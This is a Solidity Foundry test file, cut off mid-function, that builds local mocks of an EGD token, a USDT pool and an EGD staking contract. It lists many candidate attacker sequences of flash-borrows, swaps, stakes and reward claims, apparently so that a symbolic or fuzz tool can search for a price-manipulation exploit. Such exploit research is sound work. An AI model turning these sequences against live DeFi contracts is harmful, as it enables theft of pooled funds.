// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {EGDStaking} from "./EGDStaking.sol";
import {EGD} from "./EGD.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract EGDTest is Test, BlockLoader {
    EGD egd;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    EGDStaking egdstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address egdAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address egdstakingAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1659914092;
    uint112 reserve0pair = 52443151506653906536540000;
    uint112 reserve1pair = 424456224403899287665961;
    uint32 blockTimestampLastpair = 1659914092;
    uint256 kLastpair = 22259713976354534524259402206876732922981387200000;
    uint256 price0CumulativeLastpair =
        17926177941217205516333779465403739154183922;
    uint256 price1CumulativeLastpair =
        4165161045287207174726887479302333129143660;
    uint256 totalSupplyegd = 118000000000000000000000000;
    uint256 balanceOfegdpair = 52443151506653906536540000;
    uint256 balanceOfegdattacker = 0;
    uint256 balanceOfegdegdstaking = 5670246682724687331970000;
    uint256 totalSupplyusdt = 4979997922172658408539526080;
    uint256 balanceOfusdtpair = 424456224403899287665961;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtegdstaking = 3;

    function setUp() public {
        owner = address(this);
        egd = new EGD();
        egdAddr = address(egd);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(egd),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        egdstaking = new EGDStaking(
            address(egd),
            address(usdt),
            address(router),
            address(pair)
        );
        egdstakingAddr = address(egdstaking);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        egd.transfer(address(pair), balanceOfegdpair);
        usdt.transfer(address(egdstaking), balanceOfusdtegdstaking);
        egd.transfer(address(egdstaking), balanceOfegdegdstaking);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Egd Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(egd), usdt.decimals());
        queryERC20BalanceDecimals(address(egd), address(egd), egd.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(usdt), egd.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(pair), egd.decimals());
        emit log_string("");
        emit log_string("Egdstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(egdstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(egdstaking),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(attacker),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_egd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_egd_owner(uint256 amount) internal eurus {
        egd.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_egd_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_egd_pair(uint256 amount) internal eurus {
        egd.transfer(address(pair), amount);
    }

    function swap_pair_attacker_egd_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        egd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_usdt_egd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_egdstaking_usdt_egdslp(uint256 amount) internal eurus {
        usdt.approve(address(egdstaking), amount);
        egdstaking.stake(amount);
        vm.warp(block.timestamp + 54);
    }

    function withdraw_egdstaking_egdslp_egd(uint256 amount) internal eurus {
        egdstaking.claimAllReward();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_usdt_egd(amt2, amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        swap_pair_attacker_usdt_egd(amt3, amt4);
        payback_egd_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_egd_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        payback_egd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        payback_egd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_egd_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_egd_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_usdt_egd(amt2, amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        payback_egd_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_egd_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        deposit_egdstaking_usdt_egdslp(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        payback_egd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        borrow_usdt_pair(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        payback_usdt_pair(amt6);
        payback_egd_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        borrow_egd_pair(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        payback_egd_pair(amt6);
        payback_egd_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        payback_egd_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        payback_egd_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_usdt_egd(amt5, amt6);
        payback_egd_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        swap_pair_attacker_usdt_egd(amt5, amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_usdt_egd(amt2, amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        swap_pair_attacker_usdt_egd(amt6, amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        swap_pair_attacker_usdt_egd(amt6, amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        swap_pair_attacker_usdt_egd(amt6, amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        swap_pair_attacker_usdt_egd(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        swap_pair_attacker_usdt_egd(amt3, amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        swap_pair_attacker_usdt_egd(amt7, amt8);
        payback_egd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        swap_pair_attacker_usdt_egd(amt8, amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        swap_pair_attacker_usdt_egd(amt8, amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        swap_pair_attacker_usdt_egd(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        swap_pair_attacker_usdt_egd(amt8, amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        swap_pair_attacker_usdt_egd(amt3, amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        swap_pair_attacker_usdt_egd(amt8, amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_egd(amt1, amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        swap_pair_attacker_usdt_egd(amt5, amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        swap_pair_attacker_usdt_egd(amt3, amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        payback_egd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        swap_pair_attacker_usdt_egd(amt7, amt8);
        payback_egd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_egd_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_egd_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_usdt_egd(amt2, amt3);
